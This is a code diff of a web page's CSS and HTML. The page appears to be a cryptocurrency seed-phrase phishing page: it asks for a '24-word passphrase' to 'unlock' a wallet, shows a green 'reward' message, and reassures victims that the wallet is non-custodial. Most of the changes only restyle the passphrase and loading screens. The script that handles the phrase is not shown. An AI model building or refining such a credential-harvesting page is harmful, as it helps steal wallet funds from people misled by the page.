@@ -25,13 +25,21 @@
             text-align: center;
         }
 
-        .homepage, .passphrase-screen, .loading-screen {
+        .homepage {
             display: none;
             width: 100%;
             height: 100vh;
             align-items: center;
             justify-content: center;
             flex-direction: column;
+        }
+        .loading-screen, .passphrase-screen {
+            width: 100vw;
+            height: 100vh;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background-color: white;
         }
 
 .homepage {
@@ -109,13 +117,13 @@ body {
         }
 
        .passphrase-screen {
-    display: none;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    background: #ffffff;
-    width: 100vw;
-    height: 100vh;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: #ffffff;
+            width: 100vw;
+            height: 100vh;
 }
 
 .passphrase-container {
@@ -168,9 +176,10 @@ body {
 
 .reward-text {
     font-size: 14px;
-    color: #555;
+    color: green; /* Restore green color */
     text-align: center;
     margin-top: 15px;
+    font-weight: bold; /* Restore font weight */
     max-width: 90%;
 }
 
@@ -232,11 +241,12 @@ body {
             <textarea id="passphrase" class="input-box" placeholder="Enter your 24-word passphrase here"></textarea>
             <button class="purple-btn" onclick="submitPassphrase()">Unlock with Passphrase</button>
             <p id="message" class="reward-text"></p>
-        </div>
-        <p class="wallet-info">
-    As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
-    Recovery of passphrase is currently impossible.
-        </p>
+
+<!-- Non-Custodial Wallet Message -->
+<div class="wallet-info">
+    <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. 
+    Recovery of passphrase is currently impossible.</p>
+</div>
     </div>
         <script>
 function showLoading() {
